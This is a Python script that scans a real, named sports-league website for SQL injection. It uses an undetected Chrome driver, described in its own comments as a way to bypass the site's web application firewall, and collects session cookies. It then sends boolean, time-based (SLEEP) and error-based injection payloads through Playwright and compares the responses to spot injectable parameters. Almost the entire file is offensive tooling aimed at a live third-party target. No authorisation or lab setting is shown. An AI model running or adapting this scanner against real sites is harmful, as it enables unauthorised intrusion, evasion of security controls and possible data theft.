import undetected_chromedriver as uc
import asyncio
import time
from playwright.async_api import async_playwright
from urllib.parse import urlencode
from difflib import SequenceMatcher

# -------------------- Configuration --------------------
base_url = "https://bal.nba.com/teams/fus-de-rabat"
default_params = {"view": "roster"}
target_param = ""

# -------------------- Variasi Payloads --------------------
payloads = {
    "Boolean-TRUE": "' AND 'a'='a' --",
    "Boolean-FALSE": "' AND 'a'='1' --",
    "Time-TRUE": "' AND SLEEP(5)--",
    "Time-FALSE": "'",
    "Error-Based": "' AND (SELECT 1/0)--"
}

# -------------------- Helpers --------------------
def make_url(param_name, payload):
    all_params = default_params.copy()
    all_params[param_name] = payload
    return base_url + "?" + urlencode(all_params)

# -------------------- Cookie Collection --------------------
def get_cookies_from_chrome(url):
    print("[*] Launching Chrome to bypass WAF...")
    options = uc.ChromeOptions()
    options.add_argument("--no-sandbox")
    driver = uc.Chrome(options=options)
    driver.get(url)
    input("[!] Press ENTER after the page is loaded...")
    cookies = driver.get_cookies()
    try:
        driver.quit()
    except Exception as e:
        print(f"[!] Chrome quit warning ignored: {e}")
    return cookies

# -------------------- Playwright Request --------------------
async def fetch_content(url, cookies):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        await context.add_cookies([{
            "name": c["name"],
            "value": c["value"],
            "domain": c["domain"],
            "path": c["path"],
            "httpOnly": c.get("httpOnly", False),
            "secure": c.get("secure", False)
        } for c in cookies])
        page = await context.new_page()
        start = time.time()
        await page.goto(url, timeout=60000)
        duration = time.time() - start
        content = await page.content()
        await browser.close()
        return content, duration

# -------------------- Similarity Comparison --------------------
def print_similarity_score(html1, html2):
    ratio = SequenceMatcher(None, html1, html2).ratio()
    print(f"[+] Similarity score: {ratio:.2f}")
    if ratio < 0.95:
        print("[!] Possible Boolean-Based SQLi detected!")
    else:
        print("[✓] No significant difference detected.")

# -------------------- Main Logic --------------------
if __name__ == "__main__":
    cookies = get_cookies_from_chrome(base_url)

    print("\n[Boolean-Based Test]")

    true_url = make_url(target_param, payloads["Boolean-TRUE"])
    false_url = make_url(target_param, payloads["Boolean-FALSE"])

    true_html, _ = asyncio.run(fetch_content(true_url, cookies))
    false_html, _ = asyncio.run(fetch_content(false_url, cookies))

    with open("response_boolean_true.html", "w", encoding="utf-8") as f:
        f.write(true_html)
    with open("response_boolean_false.html", "w", encoding="utf-8") as f:
        f.write(false_html)

    print("[+] Boolean-TRUE response saved to response_boolean_true.html")
    print("[+] Boolean-FALSE response saved to response_boolean_false.html")

    print_similarity_score(true_html, false_html)

    print("\n[Time-Based Test]")
    slow_url = make_url(target_param, payloads["Time-TRUE"])
    fast_url = make_url(target_param, payloads["Time-FALSE"])
    _, t1 = asyncio.run(fetch_content(fast_url, cookies))
    _, t2 = asyncio.run(fetch_content(slow_url, cookies))
    print(f"[+] Normal load time: {t1:.2f}s, Payload with SLEEP(5): {t2:.2f}s")
    if t2 > t1 + 3:
        print("[!] Possible Time-Based SQLi detected!")
    else:
        print("[✓] No significant delay.")

    print("\n[Error-Based Test]")
    error_url = make_url(target_param, payloads["Error-Based"])
    error_html, _ = asyncio.run(fetch_content(error_url, cookies))
    with open("response_error_based.html", "w", encoding="utf-8") as f:
        f.write(error_html)
    print("[+] Error-based response saved to response_error_based.html")